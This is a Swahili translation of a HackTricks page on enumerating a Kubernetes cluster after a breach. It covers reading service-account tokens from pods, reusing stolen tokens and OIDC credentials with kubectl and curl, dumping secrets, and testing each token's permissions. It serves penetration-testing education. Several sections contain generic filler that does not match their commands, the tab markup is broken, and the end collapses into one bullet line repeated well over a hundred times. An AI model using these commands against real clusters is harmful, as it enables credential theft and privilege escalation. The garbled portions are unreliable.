# Uchambuzi wa Kubernetes

{% hint style="success" %}
Jifunze na zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Vitambulisho vya Kubernetes

Ikiwa umepata ufikiaji uliodhuru kwenye mashine, mtumiaji anaweza kuwa na ufikiaji wa jukwaa la Kubernetes. Kadi ya vitambulisho kawaida iko kwenye faili inayoelekezwa na **env var `KUBECONFIG`** au **ndani ya `~/.kube`**.

Katika folda hii unaweza kupata faili za usanidi na **vitambulisho na usanidi wa kuunganisha kwenye seva ya API**. Katika folda hii pia unaweza kupata folda ya cache na habari iliyopatikana hapo awali.

Ikiwa umedhuru podi ndani ya mazingira ya kubernetes, kuna maeneo mengine ambapo unaweza kupata vitambulisho na habari kuhusu mazingira ya sasa ya K8:

### Vitambulisho vya Akaunti ya Huduma

Kabla ya kuendelea, ikiwa haujui ni nini **akaunti ya huduma** katika Kubernetes, ningependekeza ufuatilie kiungo hiki na usome angalau habari kuhusu usanifu wa Kubernetes.

Imechukuliwa kutoka kwenye [hati ya Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_‚ÄúUnapounda podi, ikiwa haujataja akaunti ya huduma, inapewa moja kwa moja_ akaunti ya huduma ya chaguo _katika jina la uga huo huo.‚Äù_

**Akaunti ya Huduma** ni kitu kinachosimamiwa na Kubernetes na hutumiwa kutoa kitambulisho kwa michakato inayofanya kazi kwenye podi.\
Kila akaunti ya huduma ina siri inayohusiana nayo na siri hii ina kadi ya kubeba. Hii ni JSON Web Token (JWT), njia ya kuwakilisha madai kwa usalama kati ya pande mbili.

Kawaida **moja** ya saraka:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

ina faili:

* **ca.crt**: Ni cheti cha ca cha kuangalia mawasiliano ya kubernetes
* **namespace**: Inaonyesha uga wa sasa
* **token**: Ina **kadi ya huduma** ya podi ya sasa.

Sasa ukiwa na kadi hiyo, unaweza kupata seva ya API ndani ya mazingira ya mazingira ya **`KUBECONFIG`**. Kwa habari zaidi endesha `(env | set) | grep -i "kuber|kube`**`"`**

Kadi ya akaunti ya huduma inasainiwa na ufunguo unaokaa kwenye faili ya **sa.key** na kuthibitishwa na **sa.pub**.

Mahali pa kawaida kwenye **Kubernetes**:

* /etc/kubernetes/pki

Mahali pa kawaida kwenye **Minikube**:

* /var/lib/localkube/certs

### Podi za Moto

_**Podi za moto**_ ni podi zinazojumuisha kadi ya akaunti ya huduma yenye ruhusa. Kadi ya akaunti ya huduma yenye ruhusa ni kadi inayoruhusiwa kufanya kazi zenye ruhusa kama vile orodha za siri, kuunda podi, n.k.

## RBAC

Ikiwa haujui ni nini **RBAC**, **soma sehemu hii**.

## Orodha ya Uchambuzi

Ili kuchambua mazingira ya K8s unahitaji haya:

* **Kadi ya uthibitisho halali**. Katika sehemu iliyopita tuliona wapi kutafuta kadi ya mtumiaji na kadi ya akaunti ya huduma.
* **Anwani (**_**https://host:port**_**) ya API ya Kubernetes**. Hii kawaida inaweza kupatikana katika mazingira ya mazingira na/au kwenye faili ya kube config.
* **Hiari**: **ca.crt kuthibitisha seva ya API**. Hii inaweza kupatikana mahali ambapo kadi inaweza kupatikana. Hii ni muhimu kuthibitisha cheti cha seva ya API, lakini kwa kutumia `--insecure-skip-tls-verify` na `kubectl` au `-k` na `curl` hautahitaji hii.

Kwa maelezo hayo unaweza **kuchambua kubernetes**. Ikiwa **API** kwa sababu fulani ni **inapatikana** kupitia **Intaneti**, unaweza tu kupakua habari hiyo na kuchambua jukwaa kutoka kwa mwenyeji wako.

Walakini, kawaida **seva ya API iko ndani ya mtandao wa ndani**, kwa hivyo utahitaji **kuunda handaki** kupitia mashine iliyodhuriwa ili kufikia kutoka kwa mashine yako, au unaweza **kuiweka** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binary, au tumia **`curl/wget/chochote`** kufanya maombi ya HTTP ya moja kwa moja kwa seva ya API.

### Tofauti kati ya vitenzi vya `list` na `get`

Kwa **ruhusa za kupata** unaweza kupata habari ya mali maalum (_chaguo la `eleza` katika `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Ikiwa una **ruhusa ya `orodha`**, unaruhusiwa kutekeleza maombi ya API ya kuorodhesha aina fulani ya mali (_chaguo la `pata` katika `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Ikiwa una **ruhusa ya** **`watch`**, unaruhusiwa kutekeleza maombi ya API kufuatilia mali:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Wanafungua uhusiano wa kistimuzi ambao unakurudishia hati kamili ya Upelekaji kila wakati inabadilika (au wakati mpya inaundwa).

{% hint style="danger" %}
Amri za `kubectl` zifuatazo zinaonyesha jinsi ya kuorodhesha vitu. Ikiwa unataka kupata data unahitaji kutumia `eleza` badala ya `pata`
{% endhint %}

### Kutumia curl

Kutoka ndani ya kisanduku unaweza kutumia mazingira kadhaa ya mazingira:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Kwa chaguo-msingi pod inaweza **kupata** **kube-api server** kwa jina la uwanja **`kubernetes.default.svc`** na unaweza kuona mtandao wa kube katika **`/etc/resolv.config`** kwa sababu hapa utapata anwani ya kisanduku cha DNS cha kubernetes (".1" ya safu hiyo ni mwisho wa kube-api).
{% endhint %}

### Kutumia kubectl

Ukiwa na tokeni na anwani ya seva ya API unatumia kubectl au curl kufikia kama ilivyoelezwa hapa:

Kwa chaguo-msingi, APISERVER ina mawasiliano na `https://` muundo
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> if no `https://` in url, you may get Error Like Bad Request.

Unaweza kupata [**cheatsheet rasmi ya kubectl hapa**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Lengo la sehemu zifuatazo ni kutoa kwa mpangilio tofauti chaguo za kuhesabu na kuelewa K8s mpya ambayo umepata ufikiaji.

Ili kupata ombi la HTTP ambalo `kubectl` inatuma unaweza kutumia parameter `-v=8`

#### MitM kubectl - Kupakia kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Mpangilio wa Sasa

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Ikiwa umefanikiwa kuiba baadhi ya siri za watumiaji unaweza **kuziweka kwenye mfumo wako wa ndani** kwa kutumia kitu kama:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Pata Rasilimali Zinazoungwa

Kwa habari hii utajua huduma zote unazoweza kuorodhesha

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Pata Mamlaka ya Sasa

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 
### Uchambuzi wa API

Kuchunguza API kwa kutumia mbinu za uchambuzi wa kawaida kunaweza kufunua habari muhimu kuhusu rasilimali zilizopo kwenye kikundi cha Kubernetes. Hapa kuna baadhi ya njia za kawaida za kufanya uchambuzi wa API:

1. **Kutumia Swagger/OpenAPI Documentation**: Kuchunguza nyaraka za Swagger au OpenAPI kunaweza kutoa ufahamu wa rasilimali zinazopatikana na maelezo ya jinsi wanavyoweza kushughulikiwa.

2. **Kutumia Kubectl**: Kukimbia amri za `kubectl` kama `kubectl get pods` au `kubectl get services` kunaweza kutoa orodha ya rasilimali zilizopo kwenye kikundi cha Kubernetes.

3. **Kutumia Curl**: Kutuma maombi ya HTTP moja kwa moja kwa API endpoints kunaweza kufunua habari zaidi kuhusu rasilimali na vitendo vinavyoweza kutekelezwa.

4. **Kutumia Kube-Hunter**: Kube-Hunter ni chombo cha uchambuzi wa usalama kinachoweza kutambua hatari za usalama kwenye mazingira ya Kubernetes, pamoja na API zilizowekwa vibaya.

Kwa kufanya uchambuzi wa API kwa uangalifu, unaweza kugundua mapungufu ya usalama na kuchukua hatua za kurekebisha kabla ya kutokea kwa shambulio. 
{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Njia nyingine ya kuangalia mamlaka yako ni kutumia zana: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Unaweza kujifunza zaidi kuhusu **Kubernetes RBAC** katika:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Marakwet unapojua ni mamlaka zipi** unazo, angalia ukurasa ufuatao kubaini **kama unaweza kuzitumia vibaya** kuinua mamlaka:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Pata Majukumu Mengine

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 
### Uchunguzi wa API

Kuchunguza API kunaweza kufunua habari muhimu kuhusu rasilimali zilizopo kwenye kikundi cha Kubernetes. Unaweza kutumia zana kama `kubectl` au `kube-api` kufanya uchunguzi wa API. Kwa kufanya hivyo, unaweza kupata maelezo kama majina ya podi, huduma, na seva zilizopo kwenye kikundi cha Kubernetes. Hii inaweza kusaidia katika kubaini vitisho vya usalama na mapungufu ya usalama katika mazingira ya Kubernetes. 
{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
### Pata majina ya nafasi

Kubernetes inasaidia **makundi ya vituo vya kielelezo** yanayoungwa mkono na kikundi kimoja cha mwili. Makundi haya ya vituo vya kielelezo huitwa **majina ya nafasi**.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 
### Uchambuzi wa API

Kuchunguza API kwa kutumia kubernetes inaweza kufunua habari muhimu kuhusu mazingira ya kubernetes. Unaweza kutumia zana kama `kubectl` au `kube-api` kufanya uchunguzi wa API. Kwa mfano, unaweza kupata habari kuhusu pods, services, na deployments zilizopo kwenye kubernetes cluster. Pia, unaweza kuchunguza vyanzo vya data vinavyopatikana kupitia API kama vile kubelet, kube-proxy, na kube-scheduler. Kwa kufanya hivyo, unaweza kugundua mapungufu yoyote ya usalama au udhaifu katika mazingira yako ya kubernetes. 
{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Pata siri

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 
### Uchunguzi wa Kubernetes

#### Kuchunguza API Server

Kuanza, tunaweza kutumia amri ifuatayo kuchunguza API server:

```bash
kubectl get --raw /
```

Hii itatoa majibu ya API server kwa muundo wa JSON. Tunaweza pia kutumia amri hii kuchunguza sehemu maalum ya API server kama vile `/version`:

```bash
kubectl get --raw /version
```

#### Kuchunguza Rasilimali za Kubernetes

Tunaweza kutumia amri ifuatayo kuchunguza rasilimali zilizopo kwenye kikundi cha rasilimali cha Kubernetes:

```bash
kubectl get pods
kubectl get deployments
kubectl get services
```

Hii itatoa orodha ya pods, deployments, au services zilizopo kwenye kikundi cha rasilimali cha Kubernetes.

#### Kuchunguza Maelezo ya Rasilimali

Tunaweza kutumia amri ifuatayo kuchunguza maelezo ya rasilimali fulani kwa kutumia jina lake:

```bash
kubectl describe pod <pod_name>
kubectl describe deployment <deployment_name>
kubectl describe service <service_name>
```

Hii itatoa maelezo ya kina kuhusu rasilimali fulani kama pod, deployment, au service kulingana na jina lililotolewa.

#### Kuchunguza Logs za Kontena

Tunaweza kutumia amri ifuatayo kuchunguza logs za kontena fulani:

```bash
kubectl logs <pod_name>
```

Hii itatoa logs za kontena fulani kulingana na jina la pod lililotolewa.

#### Kuchunguza Configuration za Kontena

Tunaweza kutumia amri ifuatayo kuchunguza configuration za kontena fulani:

```bash
kubectl exec -it <pod_name> -- /bin/sh
```

Hii itaturuhusu kuingia kwenye kontena fulani na kuchunguza configuration yake kwa kutumia shell.

#### Kuchunguza RBAC Policies

Tunaweza kutumia amri ifuatayo kuchunguza Role-Based Access Control (RBAC) policies zilizowekwa:

```bash
kubectl get clusterrolebindings
kubectl get clusterroles
kubectl auth can-i <verb> <resource> --as <subject>
```

Hii itatoa orodha ya RBAC policies zilizowekwa kwenye kikundi cha rasilimali cha Kubernetes na pia itaruhusu kuuliza ikiwa hatua fulani inaweza kufanywa na mada fulani.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Ikiwa unaweza kusoma siri unaweza kutumia mistari ifuatayo kupata mamlaka yanayohusiana na kila ishara:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Pata Akaunti za Huduma

Kama ilivyojadiliwa mwanzoni mwa ukurasa huu **wakati podi inapoendeshwa akaunti ya huduma kawaida huteuliwa kwake**. Hivyo, kuorodhesha akaunti za huduma, ruhusa zao na wanakotumika inaweza kuruhusu mtumiaji kupandisha viwango vya ruhusa.
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} 
### Uchunguzi wa API

Kuchunguza API kunaweza kufunua habari muhimu kuhusu rasilimali zilizopo kwenye kikundi cha Kubernetes. Unaweza kutumia zana kama `kubectl` au `kubectx` kuchunguza API na kupata maelezo kama majina ya podi, huduma, na sehemu zingine za mfumo. Pia, unaweza kutumia amri za `curl` au zana zingine za HTTP kuchunguza API za Kubernetes. Kwa kufanya hivyo, unaweza kugundua habari muhimu ambayo inaweza kusaidia katika uchambuzi wa usalama. 
{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### Pata Utekelezaji

Utekelezaji hufafanua **vipengele** vinavyohitaji **kutekelezwa**.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 
### Uchunguzi wa API

Kuchunguza API kunaweza kufunua habari muhimu kuhusu rasilimali zilizopo kwenye kikundi cha Kubernetes. Unaweza kutumia zana kama `kubectl` au `kubectx` kuchunguza API na kupata maelezo kama majina ya podi, huduma, na sehemu zingine za mfumo. Pia, unaweza kutumia amri za `curl` au zana zingine za HTTP kuchunguza API za Kubernetes moja kwa moja.

Kwa mfano, unaweza kutumia amri ifuatayo kuchunguza rasilimali za API ya Kubernetes:

```bash
kubectl get pods
kubectl get services
kubectl get deployments
```

Kwa kufanya uchunguzi wa API kwa uangalifu, unaweza kugundua maelezo muhimu ambayo yanaweza kusaidia katika hatua zingine za uchambuzi wa usalama. 
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### Pata Pods

Pods ni **makontena** halisi ambayo yataendeshwa.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 
### Uchunguzi wa API

Kuchunguza API za Kubernetes kunaweza kufunua habari muhimu kuhusu mazingira ya kifaa. Unaweza kutumia zana kama `kubectl` au `kube-api` kufanya uchunguzi huu. Baadhi ya vitu unavyoweza kuchunguza ni:

- Majina ya vikundi vya rasilimali
- Majina ya majina ya nafasi
- Majina ya huduma
- Majina ya seva
- Majina ya kikundi cha kuhifadhi
- Majina ya akaunti za huduma
- Majina ya majina ya kikundi cha mtandao
- Majina ya sera za mtandao
- Majina ya mipangilio ya mtandao
- Majina ya mipangilio ya kikundi cha mtandao
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
